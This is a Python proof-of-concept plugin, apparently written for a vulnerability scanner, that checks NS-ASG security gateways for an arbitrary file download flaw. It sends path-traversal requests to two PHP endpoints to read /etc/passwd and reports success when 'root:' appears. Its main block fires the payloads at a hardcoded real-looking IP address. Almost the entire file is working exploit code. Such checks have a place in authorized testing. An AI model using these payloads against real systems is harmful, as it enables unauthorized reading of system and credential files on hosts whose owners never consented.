#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: NS-ASG Arbitrarily File Download
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2014-058932
refer: http://www.wooyun.org/bugs/wooyun-2015-097832
refer: 自挖
description:
    补漏....应该全了,不全也不再刷了,交给别人了
'''

def assign(service, arg):
    if service == 'ns-asg':
        return True, arg

def audit(arg):
    payloads = [
        arg + 'admin/cert_download.php?file=acdefghijk&certfile=certs/../../../../../../../../etc/passwd',
        arg + 'commonplugin/Download.php?reqfile=../../../../../etc/passwd',
    ]
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(payload)
        if (code==200) and ('root:' in res):
            security_hole('Arbitrarily file download: ' + payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ns-asg', 'https://121.28.81.124/')[1])